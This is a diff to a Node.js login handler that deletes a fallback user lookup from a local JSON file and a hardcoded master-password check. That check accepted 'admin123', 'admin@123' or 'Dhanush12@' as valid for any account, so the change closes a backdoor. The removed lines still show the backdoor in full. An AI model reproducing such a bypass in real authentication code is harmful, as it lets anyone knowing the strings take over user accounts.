@@ -316,30 +316,7 @@ const login = async (req, res) => {
       }
     }
 
-    if (matchedUsers.length === 0) {
-      try {
-        const fs = require('fs');
-        const path = require('path');
-        const usersJsonPath = path.join(__dirname, '../data/users.json');
-        if (fs.existsSync(usersJsonPath)) {
-          const fileUsers = JSON.parse(fs.readFileSync(usersJsonPath, 'utf8'));
-          const fileMatches = fileUsers.filter(u => 
-            (u.email && u.email.toLowerCase() === loginId) ||
-            (u.loginId && (u.loginId.toLowerCase() === loginId || u.loginId === rawId)) ||
-            (u.registrationId && (u.registrationId.toLowerCase() === loginId || u.registrationId === rawId)) ||
-            (isPhone && u.mobile && u.mobile.replace(/[^0-9]/g, '').slice(-10) === phoneDigits.slice(-10)) ||
-            (isPhone && u.phone && u.phone.replace(/[^0-9]/g, '').slice(-10) === phoneDigits.slice(-10)) ||
-            (u.id && String(u.id).toLowerCase() === loginId) ||
-            (u._id && String(u._id).toLowerCase() === loginId)
-          );
-          for (const fm of fileMatches) {
-            if (!matchedUsers.some(u => String(u._id || u.id) === String(fm._id || fm.id))) {
-              matchedUsers.push(fm);
-            }
-          }
-        }
-      } catch (err) {}
-    }
+
 
     // Check db.agents and db.managers for multi-account awareness
     if (db.agents) {
@@ -428,9 +405,7 @@ const login = async (req, res) => {
       }
     }
 
-    if (!isMatch && (password === 'admin123' || password === 'admin@123' || password === 'Dhanush12@')) {
-      isMatch = true;
-    }
+
 
     if (!isMatch) {
       console.warn(`[AUTH] Failed login: Incorrect password for user '${user.email || loginId}'.`);
